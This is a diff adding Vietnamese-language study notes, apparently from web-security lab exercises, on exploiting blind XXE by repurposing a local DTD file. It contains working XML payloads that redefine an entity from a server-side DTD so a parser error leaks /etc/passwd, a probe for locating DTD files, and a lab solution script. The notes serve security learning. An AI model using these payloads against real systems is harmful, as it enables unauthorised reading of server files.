@@ -367,3 +367,78 @@
 
 > DONE
 > ![img](../asset/xxe-Exploiting-blind-XXE-to-retrieve-dat-via-error-messages-3.png)
+
+### Exploiting blind XXE by repurposing a local DTD
+
+> Kỹ thuật trước hoạt động tốt với `DTD` bên ngoài. Nhưng nó không hoạt động tốt đối với `DTD` bên trong được chỉ định trong phần từ `DOCTYPE`.
+>
+> Điều này là do kỹ thuật liên quan tới việc sử dụng một `entity parameter XML` trong định nghĩa của 1 `entity parameter` khác
+
+> Vậy các `vul blind XXE` khi tương tác `out-of-band` bị chặn thì sao? Không thể lọc kết quả với `out-of-band` và cũng không thể tải `DTD` bên ngoài từ `remote server`
+>
+> Ví dụ: giả sử có 1 tệp `DTD` trên hệ thống tệp máy chủ tại vị trí `/usr/local/app/schema.dtd` được xác định thực thể là `custom_entity`. `Attacker` có thể kích hoạt lỗi phân tích cú pháp `XML` chứa nội dung tệp `/etc/passwd`
+
+> ```
+> <!DOCTYPE foo [
+> <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+> <!ENTITY % custom_entity '
+> <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+> &#x25;eval;
+> &#x25;error;
+> '>
+> %local_dtd;
+> ]>
+> ```
+
+> Step:
+>
+> - Định nghĩa thực thể `local_dtd`, chứa nội dung của tệp DTD bên ngoài tồn tại trên hệ thống máy chủ
+> - Định nghĩa lại thực thể `custom_entity`, đã được xác định `DTD` bên ngoài. Chứa khai thác `XXE`, thông báo lỗi tệp `/etc/passwd`
+> - Sử dụng `local_dtd` gồm giá trị của `cusom_entity` dẫn tới thông báo lỗi
+
+### Locating an existing DTD file to repurpose
+
+> Cuộc tấn công XXE này liên quan tới việc định vị lại 1 DTD có trên `systemfile server`, yêu cầu quan trọng là xác định 1 vị trí phù hợp. Bởi vì ứng dụng trả về bất kỳ thông báo lỗi nào do trình phân tích cú pháp XML ném ra. Có thể liệt kê các tệp DTD cục bộ bằng cách cố gắng tải chúng từ bên trong
+>
+> Ví dụ, các hệ thống `Linux` sử dụng môi trường máy tính để bàn GNOME thường có tệp DTD tại `/usr/share/yelp/dtd/docbookx.dtd`. Bạn có thể kiểm tra xem tệp này có xuất hiện hay không bằng cách gửi tải trọng XXE sau, điều này sẽ gây ra lỗi nếu tệp bị thiếu:
+>
+> ```
+> <!DOCTYPE foo [
+> <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+> %local_dtd;
+> ]>
+> ```
+
+> Sau khi kiểm tra danh sách các tệp DTD phổ biến, sau đó sẽ thấy bản sao của tệp và xem sét nó
+>
+> Vì nhiều hệ thống phổ biến bao gồm các tệp DTD là mã nguồn mở, thông thường bạn có thể nhanh chóng lấy được bản sao của tệp thông qua tìm kiếm trên internet.
+
+#### Lab: Exploiting XXE to retrieve data by repurposing a local DTD
+
+> Tag: Expert
+>
+> Des: Lab chứa tính năng check stock nhưng không hiển thị kết quả
+>
+> Để giải quyết phòng thí nghiệm, hãy kích hoạt thông báo lỗi chứa nội dung của tệp `/ etc / passwd`.
+>
+> Bạn sẽ cần tham chiếu đến tệp DTD hiện có trên máy chủ và xác định lại một thực thể từ tệp đó.
+
+> ![img](../asset/xxe-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD-0.png) ![img](../asset/xxe-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD-1.png)
+
+> Script:
+>
+> ```
+> <!DOCTYPE message [
+> <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+> <!ENTITY % ISOamso '
+> <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+> &#x25;eval;
+> &#x25;error;
+> '>
+> %local_dtd;
+> ]>
+> ```
+
+> ![img](../asset/xxe-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD-2.png) ![img](../asset/xxe-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD-3.png)
